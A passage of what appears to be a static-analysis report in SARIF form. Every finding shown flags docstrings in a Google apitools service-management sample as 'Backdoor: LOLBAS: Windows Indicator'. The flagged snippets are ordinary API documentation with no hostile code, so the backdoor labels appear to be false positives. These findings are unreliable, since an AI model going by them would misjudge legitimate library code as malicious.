            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1576,
                  "startColumn": 24,
                  "endLine": 1576,
                  "endColumn": 28,
                  "snippet": {
                    "text": "  application, giving it permission to access that data on their behalf.\n  OAuth scope specifications should be fairly coarse grained; a user will need\n  to see and understand the text description of what your scope means.  In\n  most cases: use one or at most two OAuth scopes for an entire family of\n  products. If your product has multiple APIs, you should probably be sharing\n  the OAuth scope across all of those APIs.  When you need finer grained OAuth\n  consent screens: talk with your product management about how developers will\n",
                    "rendered": {
                      "text": "  application, giving it permission to access that data on their behalf.\n  OAuth scope specifications should be fairly coarse grained; a user will need\n  to see and understand the text description of what your scope means.  In\n  most cases: use one or at most two OAuth scopes for an entire family of\n  products. If your product has multiple APIs, you should probably be sharing\n  the OAuth scope across all of those APIs.  When you need finer grained OAuth\n  consent screens: talk with your product management about how developers will\n",
                      "markdown": "`  application, giving it permission to access that data on their behalf.\n  OAuth scope specifications should be fairly coarse grained; a user will need\n  to see and understand the text description of what your scope means.  In\n  most cases: use one or at most two OAuth scopes for an entire family of\n  products. If your product has multiple APIs, you should probably be sharing\n  the OAuth scope across all of those APIs.  When you need finer grained OAuth\n  consent screens: talk with your product management about how developers will\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1547,
                  "startColumn": 5,
                  "endLine": 1547,
                  "endColumn": 9,
                  "snippet": {
                    "text": "    producerDestinations: Monitoring configurations for sending metrics to the\n      producer project. There can be multiple producer destinations, each one\n      must have a different monitored resource type. A metric can be used in\n      at most one producer destination.\n  \"\"\"\n\n  consumerDestinations = _messages.MessageField('MonitoringDestination', 1, repeated=True)\n",
                    "rendered": {
                      "text": "    producerDestinations: Monitoring configurations for sending metrics to the\n      producer project. There can be multiple producer destinations, each one\n      must have a different monitored resource type. A metric can be used in\n      at most one producer destination.\n  \"\"\"\n\n  consumerDestinations = _messages.MessageField('MonitoringDestination', 1, repeated=True)\n",
                      "markdown": "`    producerDestinations: Monitoring configurations for sending metrics to the\n      producer project. There can be multiple producer destinations, each one\n      must have a different monitored resource type. A metric can be used in\n      at most one producer destination.\n  \"\"\"\n\n  consumerDestinations = _messages.MessageField('MonitoringDestination', 1, repeated=True)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1543,
                  "startColumn": 5,
                  "endLine": 1543,
                  "endColumn": 9,
                  "snippet": {
                    "text": "    consumerDestinations: Monitoring configurations for sending metrics to the\n      consumer project. There can be multiple consumer destinations, each one\n      must have a different monitored resource type. A metric can be used in\n      at most one consumer destination.\n    producerDestinations: Monitoring configurations for sending metrics to the\n      producer project. There can be multiple producer destinations, each one\n      must have a different monitored resource type. A metric can be used in\n",
                    "rendered": {
                      "text": "    consumerDestinations: Monitoring configurations for sending metrics to the\n      consumer project. There can be multiple consumer destinations, each one\n      must have a different monitored resource type. A metric can be used in\n      at most one consumer destination.\n    producerDestinations: Monitoring configurations for sending metrics to the\n      producer project. There can be multiple producer destinations, each one\n      must have a different monitored resource type. A metric can be used in\n",
                      "markdown": "`    consumerDestinations: Monitoring configurations for sending metrics to the\n      consumer project. There can be multiple consumer destinations, each one\n      must have a different monitored resource type. A metric can be used in\n      at most one consumer destination.\n    producerDestinations: Monitoring configurations for sending metrics to the\n      producer project. There can be multiple producer destinations, each one\n      must have a different monitored resource type. A metric can be used in\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1238,
                  "startColumn": 69,
                  "endLine": 1238,
                  "endColumn": 73,
                  "snippet": {
                    "text": "  Fields:\n    configSource: User-supplied source configuration for the service. This is\n      distinct from the generated configuration provided in\n      `google.api.Service`. This is NOT populated on GetService calls at the\n      moment. NOTE: Any upsert operation that contains both a service_config\n      and a config_source is considered invalid and will result in an error\n      being returned.\n",
                    "rendered": {
                      "text": "  Fields:\n    configSource: User-supplied source configuration for the service. This is\n      distinct from the generated configuration provided in\n      `google.api.Service`. This is NOT populated on GetService calls at the\n      moment. NOTE: Any upsert operation that contains both a service_config\n      and a config_source is considered invalid and will result in an error\n      being returned.\n",
                      "markdown": "`  Fields:\n    configSource: User-supplied source configuration for the service. This is\n      distinct from the generated configuration provided in\n      `google.api.Service`. This is NOT populated on GetService calls at the\n      moment. NOTE: Any upsert operation that contains both a service_config\n      and a config_source is considered invalid and will result in an error\n      being returned.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1233,
                  "startColumn": 7,
                  "endLine": 1233,
                  "endColumn": 16,
                  "snippet": {
                    "text": "class ManagedService(_messages.Message):\n  r\"\"\"The full representation of an API Service that is managed by the\n  `ServiceManager` API.  Includes both the service configuration, as well as\n  other control plane deployment related information.\n\n  Fields:\n    configSource: User-supplied source configuration for the service. This is\n",
                    "rendered": {
                      "text": "class ManagedService(_messages.Message):\n  r\"\"\"The full representation of an API Service that is managed by the\n  `ServiceManager` API.  Includes both the service configuration, as well as\n  other control plane deployment related information.\n\n  Fields:\n    configSource: User-supplied source configuration for the service. This is\n",
                      "markdown": "`class ManagedService(_messages.Message):\n  r\"\"\"The full representation of an API Service that is managed by the\n  `ServiceManager` API.  Includes both the service configuration, as well as\n  other control plane deployment related information.\n\n  Fields:\n    configSource: User-supplied source configuration for the service. This is\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1207,
                  "startColumn": 73,
                  "endLine": 1208,
                  "snippet": {
                    "text": "      most one consumer destination.\n    producerDestinations: Logging configurations for sending logs to the\n      producer project. There can be multiple producer destinations, each one\n      must have a different monitored resource type. A log can be used in at\n      most one producer destination.\n  \"\"\"\n\n  consumerDestinations = _messages.MessageField('LoggingDestination', 1, repeated=True)\n",
                    "rendered": {
                      "text": "      most one consumer destination.\n    producerDestinations: Logging configurations for sending logs to the\n      producer project. There can be multiple producer destinations, each one\n      must have a different monitored resource type. A log can be used in at\n      most one producer destination.\n  \"\"\"\n\n  consumerDestinations = _messages.MessageField('LoggingDestination', 1, repeated=True)\n",
                      "markdown": "`      most one consumer destination.\n    producerDestinations: Logging configurations for sending logs to the\n      producer project. There can be multiple producer destinations, each one\n      must have a different monitored resource type. A log can be used in at\n      most one producer destination.\n  \"\"\"\n\n  consumerDestinations = _messages.MessageField('LoggingDestination', 1, repeated=True)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1203,
                  "startColumn": 73,
                  "endLine": 1204,
                  "snippet": {
                    "text": "  Fields:\n    consumerDestinations: Logging configurations for sending logs to the\n      consumer project. There can be multiple consumer destinations, each one\n      must have a different monitored resource type. A log can be used in at\n      most one consumer destination.\n    producerDestinations: Logging configurations for sending logs to the\n      producer project. There can be multiple producer destinations, each one\n      must have a different monitored resource type. A log can be used in at\n",
                    "rendered": {
                      "text": "  Fields:\n    consumerDestinations: Logging configurations for sending logs to the\n      consumer project. There can be multiple consumer destinations, each one\n      must have a different monitored resource type. A log can be used in at\n      most one consumer destination.\n    producerDestinations: Logging configurations for sending logs to the\n      producer project. There can be multiple producer destinations, each one\n      must have a different monitored resource type. A log can be used in at\n",
                      "markdown": "`  Fields:\n    consumerDestinations: Logging configurations for sending logs to the\n      consumer project. There can be multiple consumer destinations, each one\n      must have a different monitored resource type. A log can be used in at\n      most one consumer destination.\n    producerDestinations: Logging configurations for sending logs to the\n      producer project. There can be multiple producer destinations, each one\n      must have a different monitored resource type. A log can be used in at\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1025,
                  "startColumn": 40,
                  "endLine": 1025,
                  "endColumn": 44,
                  "snippet": {
                    "text": "  in the body mapping, it is not possible to have HTTP parameters, as all\n  fields not bound by the path end in the body. This makes this option more\n  rarely used in practice of defining REST APIs. The common usage of `*` is in\n  custom methods which don't use the URL at all for transferring data.  It is\n  possible to define multiple HTTP methods for one RPC by using the\n  `additional_bindings` option. Example:  ```proto service Messaging {   rpc\n  GetMessage(GetMessageRequest) returns (Message) {     option\n",
                    "rendered": {
                      "text": "  in the body mapping, it is not possible to have HTTP parameters, as all\n  fields not bound by the path end in the body. This makes this option more\n  rarely used in practice of defining REST APIs. The common usage of `*` is in\n  custom methods which don't use the URL at all for transferring data.  It is\n  possible to define multiple HTTP methods for one RPC by using the\n  `additional_bindings` option. Example:  ```proto service Messaging {   rpc\n  GetMessage(GetMessageRequest) returns (Message) {     option\n",
                      "markdown": "`  in the body mapping, it is not possible to have HTTP parameters, as all\n  fields not bound by the path end in the body. This makes this option more\n  rarely used in practice of defining REST APIs. The common usage of `*` is in\n  custom methods which don't use the URL at all for transferring data.  It is\n  possible to define multiple HTTP methods for one RPC by using the\n  `additional_bindings` option. Example:  ```proto service Messaging {   rpc\n  GetMessage(GetMessageRequest) returns (Message) {     option\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1015,
                  "startColumn": 53,
                  "endLine": 1015,
                  "endColumn": 61,
                  "snippet": {
                    "text": "  `UpdateMessage(message_id: \"123456\" message { text: \"Hi!\" })`  The special\n  name `*` can be used in the body mapping to define that every field not\n  bound by the path template should be mapped to the request body.  This\n  enables the following alternative definition of the update method:  ```proto\n  service Messaging {   rpc UpdateMessage(Message) returns (Message) {\n  option (google.api.http) = {       put: \"/v1/messages/{message_id}\"\n  body: \"*\"     };   } } message Message {   string message_id = 1;   string\n",
                    "rendered": {
                      "text": "  `UpdateMessage(message_id: \"123456\" message { text: \"Hi!\" })`  The special\n  name `*` can be used in the body mapping to define that every field not\n  bound by the path template should be mapped to the request body.  This\n  enables the following alternative definition of the update method:  ```proto\n  service Messaging {   rpc UpdateMessage(Message) returns (Message) {\n  option (google.api.http) = {       put: \"/v1/messages/{message_id}\"\n  body: \"*\"     };   } } message Message {   string message_id = 1;   string\n",
                      "markdown": "`  `UpdateMessage(message_id: \"123456\" message { text: \"Hi!\" })`  The special\n  name `*` can be used in the body mapping to define that every field not\n  bound by the path template should be mapped to the request body.  This\n  enables the following alternative definition of the update method:  ```proto\n  service Messaging {   rpc UpdateMessage(Message) returns (Message) {\n  option (google.api.http) = {       put: \"/v1/messages/{message_id}\"\n  body: \"*\"     };   } } message Message {   string message_id = 1;   string\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 1003,
                  "startColumn": 30,
                  "endLine": 1003,
                  "endColumn": 38,
                  "snippet": {
                    "text": "  primitive type. Message types are not allowed. In the case of a repeated\n  type, the parameter can be repeated in the URL, as in `...?param=A&param=B`.\n  For HTTP method kinds which allow a request body, the `body` field specifies\n  the mapping. Consider a REST update method on the message resource\n  collection:  ```proto service Messaging {   rpc\n  UpdateMessage(UpdateMessageRequest) returns (Message) {     option\n  (google.api.http) = {       put: \"/v1/messages/{message_id}\"       body:\n",
                    "rendered": {
                      "text": "  primitive type. Message types are not allowed. In the case of a repeated\n  type, the parameter can be repeated in the URL, as in `...?param=A&param=B`.\n  For HTTP method kinds which allow a request body, the `body` field specifies\n  the mapping. Consider a REST update method on the message resource\n  collection:  ```proto service Messaging {   rpc\n  UpdateMessage(UpdateMessageRequest) returns (Message) {     option\n  (google.api.http) = {       put: \"/v1/messages/{message_id}\"       body:\n",
                      "markdown": "`  primitive type. Message types are not allowed. In the case of a repeated\n  type, the parameter can be repeated in the URL, as in `...?param=A&param=B`.\n  For HTTP method kinds which allow a request body, the `body` field specifies\n  the mapping. Consider a REST update method on the message resource\n  collection:  ```proto service Messaging {   rpc\n  UpdateMessage(UpdateMessageRequest) returns (Message) {     option\n  (google.api.http) = {       put: \"/v1/messages/{message_id}\"       body:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 719,
                  "startColumn": 42,
                  "endLine": 719,
                  "endColumn": 46,
                  "snippet": {
                    "text": "    description: Description of the selected API(s).\n    selector: The selector is a comma-separated list of patterns. Each pattern\n      is a qualified name of the element which may end in \"*\", indicating a\n      wildcard. Wildcards are only allowed at the end and for a whole\n      component of the qualified name, i.e. \"foo.*\" is ok, but not \"foo.b*\" or\n      \"foo.*.bar\". To specify a default for all applicable elements, the whole\n      pattern \"*\" is used.\n",
                    "rendered": {
                      "text": "    description: Description of the selected API(s).\n    selector: The selector is a comma-separated list of patterns. Each pattern\n      is a qualified name of the element which may end in \"*\", indicating a\n      wildcard. Wildcards are only allowed at the end and for a whole\n      component of the qualified name, i.e. \"foo.*\" is ok, but not \"foo.b*\" or\n      \"foo.*.bar\". To specify a default for all applicable elements, the whole\n      pattern \"*\" is used.\n",
                      "markdown": "`    description: Description of the selected API(s).\n    selector: The selector is a comma-separated list of patterns. Each pattern\n      is a qualified name of the element which may end in \"*\", indicating a\n      wildcard. Wildcards are only allowed at the end and for a whole\n      component of the qualified name, i.e. \"foo.*\" is ok, but not \"foo.b*\" or\n      \"foo.*.bar\". To specify a default for all applicable elements, the whole\n      pattern \"*\" is used.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 666,
                  "startColumn": 38,
                  "endLine": 666,
                  "endColumn": 42,
                  "snippet": {
                    "text": "  blocks are supported. Section headers can be provided and are interpreted\n  relative to the section nesting of the context where a documentation\n  fragment is embedded.  Documentation from the IDL is merged with\n  documentation defined via the config at normalization time, where\n  documentation provided by config rules overrides IDL provided.  A number of\n  constructs specific to the API platform are supported in documentation text.\n  In order to reference a proto element, the following notation can be used:\n",
                    "rendered": {
                      "text": "  blocks are supported. Section headers can be provided and are interpreted\n  relative to the section nesting of the context where a documentation\n  fragment is embedded.  Documentation from the IDL is merged with\n  documentation defined via the config at normalization time, where\n  documentation provided by config rules overrides IDL provided.  A number of\n  constructs specific to the API platform are supported in documentation text.\n  In order to reference a proto element, the following notation can be used:\n",
                      "markdown": "`  blocks are supported. Section headers can be provided and are interpreted\n  relative to the section nesting of the context where a documentation\n  fragment is embedded.  Documentation from the IDL is merged with\n  documentation defined via the config at normalization time, where\n  documentation provided by config rules overrides IDL provided.  A number of\n  constructs specific to the API platform are supported in documentation text.\n  In order to reference a proto element, the following notation can be used:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 600,
                  "startColumn": 32,
                  "endLine": 600,
                  "endColumn": 41,
                  "snippet": {
                    "text": "      domain name. For example, google.com.  2.\n      billingAccount:{billing_account_id} A Google Cloud Plafrom billing\n      account. For Example, 123456-7890ab-cdef12.\n    quotaSettings: Settings that control how much or how fast the service can\n      be used by the consumer projects owned by the customer collectively.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.\n",
                    "rendered": {
                      "text": "      domain name. For example, google.com.  2.\n      billingAccount:{billing_account_id} A Google Cloud Plafrom billing\n      account. For Example, 123456-7890ab-cdef12.\n    quotaSettings: Settings that control how much or how fast the service can\n      be used by the consumer projects owned by the customer collectively.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.\n",
                      "markdown": "`      domain name. For example, google.com.  2.\n      billingAccount:{billing_account_id} A Google Cloud Plafrom billing\n      account. For Example, 123456-7890ab-cdef12.\n    quotaSettings: Settings that control how much or how fast the service can\n      be used by the consumer projects owned by the customer collectively.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 591,
                  "startColumn": 19,
                  "endLine": 591,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n\nclass CustomerSettings(_messages.Message):\n  r\"\"\"Settings that control how a customer (identified by a billing account)\n  uses a service\n\n  Fields:\n",
                    "rendered": {
                      "text": "\n\nclass CustomerSettings(_messages.Message):\n  r\"\"\"Settings that control how a customer (identified by a billing account)\n  uses a service\n\n  Fields:\n",
                      "markdown": "`\n\nclass CustomerSettings(_messages.Message):\n  r\"\"\"Settings that control how a customer (identified by a billing account)\n  uses a service\n\n  Fields:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 477,
                  "startColumn": 69,
                  "endLine": 478,
                  "snippet": {
                    "text": "  monitoring, etc.\n\n  Fields:\n    environment: The service control environment to use. If empty, no control\n      plane feature (like quota and billing) will be enabled.\n  \"\"\"\n\n  environment = _messages.StringField(1)\n",
                    "rendered": {
                      "text": "  monitoring, etc.\n\n  Fields:\n    environment: The service control environment to use. If empty, no control\n      plane feature (like quota and billing) will be enabled.\n  \"\"\"\n\n  environment = _messages.StringField(1)\n",
                      "markdown": "`  monitoring, etc.\n\n  Fields:\n    environment: The service control environment to use. If empty, no control\n      plane feature (like quota and billing) will be enabled.\n  \"\"\"\n\n  environment = _messages.StringField(1)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 477,
                  "startColumn": 28,
                  "endLine": 477,
                  "endColumn": 37,
                  "snippet": {
                    "text": "  monitoring, etc.\n\n  Fields:\n    environment: The service control environment to use. If empty, no control\n      plane feature (like quota and billing) will be enabled.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "  monitoring, etc.\n\n  Fields:\n    environment: The service control environment to use. If empty, no control\n      plane feature (like quota and billing) will be enabled.\n  \"\"\"\n\n",
                      "markdown": "`  monitoring, etc.\n\n  Fields:\n    environment: The service control environment to use. If empty, no control\n      plane feature (like quota and billing) will be enabled.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 252,
                  "startColumn": 10,
                  "endLine": 252,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\nclass BillingStatusRule(_messages.Message):\n  r\"\"\"Defines the billing status requirements for operations.  When used with\n  [Service Control API](https://cloud.google.com/service-control/), the\n  following statuses are supported:  - **current**: the associated billing\n  account is up to date and capable of                paying for resource\n  usages. - **delinquent**: the associated billing account has a correctable\n",
                    "rendered": {
                      "text": "\nclass BillingStatusRule(_messages.Message):\n  r\"\"\"Defines the billing status requirements for operations.  When used with\n  [Service Control API](https://cloud.google.com/service-control/), the\n  following statuses are supported:  - **current**: the associated billing\n  account is up to date and capable of                paying for resource\n  usages. - **delinquent**: the associated billing account has a correctable\n",
                      "markdown": "`\nclass BillingStatusRule(_messages.Message):\n  r\"\"\"Defines the billing status requirements for operations.  When used with\n  [Service Control API](https://cloud.google.com/service-control/), the\n  following statuses are supported:  - **current**: the associated billing\n  account is up to date and capable of                paying for resource\n  usages. - **delinquent**: the associated billing account has a correctable\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 224,
                  "startColumn": 28,
                  "endLine": 224,
                  "endColumn": 37,
                  "snippet": {
                    "text": "  library.googleapis.com/read_calls       - library.googleapis.com/write_calls\n  The next example shows how to enable billing status check and customize the\n  check behavior. It makes sure billing status check is included in the\n  `Check` method of [Service Control API](https://cloud.google.com/service-\n  control/). In the example, \"google.storage.Get\" method can be served when\n  the billing status is either `current` or `delinquent`, while\n  \"google.storage.Write\" method can only be served when the billing status is\n",
                    "rendered": {
                      "text": "  library.googleapis.com/read_calls       - library.googleapis.com/write_calls\n  The next example shows how to enable billing status check and customize the\n  check behavior. It makes sure billing status check is included in the\n  `Check` method of [Service Control API](https://cloud.google.com/service-\n  control/). In the example, \"google.storage.Get\" method can be served when\n  the billing status is either `current` or `delinquent`, while\n  \"google.storage.Write\" method can only be served when the billing status is\n",
                      "markdown": "`  library.googleapis.com/read_calls       - library.googleapis.com/write_calls\n  The next example shows how to enable billing status check and customize the\n  check behavior. It makes sure billing status check is included in the\n  `Check` method of [Service Control API](https://cloud.google.com/service-\n  control/). In the example, \"google.storage.Get\" method can be served when\n  the billing status is either `current` or `delinquent`, while\n  \"google.storage.Write\" method can only be served when the billing status is\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 85,
                  "startColumn": 45,
                  "endLine": 85,
                  "endColumn": 49,
                  "snippet": {
                    "text": "      should a DELTA metric.\n    generatedMetric: Metric generated from snapshot_metric and change_metric.\n      This is also a DELTA metric.\n    snapshotMetric: Total usage of a resource at a particular timestamp. This\n      should be a GAUGE metric.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "      should a DELTA metric.\n    generatedMetric: Metric generated from snapshot_metric and change_metric.\n      This is also a DELTA metric.\n    snapshotMetric: Total usage of a resource at a particular timestamp. This\n      should be a GAUGE metric.\n  \"\"\"\n\n",
                      "markdown": "`      should a DELTA metric.\n    generatedMetric: Metric generated from snapshot_metric and change_metric.\n      This is also a DELTA metric.\n    snapshotMetric: Total usage of a resource at a particular timestamp. This\n      should be a GAUGE metric.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 81,
                  "startColumn": 42,
                  "endLine": 81,
                  "endColumn": 46,
                  "snippet": {
